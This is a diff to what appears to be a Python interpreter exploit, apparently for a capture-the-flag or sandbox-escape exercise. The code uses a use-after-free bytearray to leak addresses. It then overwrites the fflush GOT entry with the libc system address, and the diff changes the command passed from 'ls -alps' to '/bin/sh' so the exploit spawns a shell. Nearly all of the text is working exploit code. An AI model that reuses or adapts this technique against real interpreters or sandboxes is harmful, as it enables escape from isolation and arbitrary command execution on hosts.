@@ -8,6 +8,7 @@ class B:
 
 uaf = bytearray(56)
 uaf[23] = B()
+print(hex(id(memory)))
 
 vm = lambda x: hex(id(x))
 # pie leak!
@@ -41,7 +42,7 @@ bs = bytearray(system_libc_address.to_bytes(8, byteorder='little'))
 for i in range(8):
     memory[fflush_got_address + i] = bs[i]
 
-target_str = b"ls -alps"
+target_str = b"/bin/sh"
 target_offset = id(target_str) + 0x20
 bs = bytearray(target_offset.to_bytes(8, byteorder='little'))
 for i in range(8):
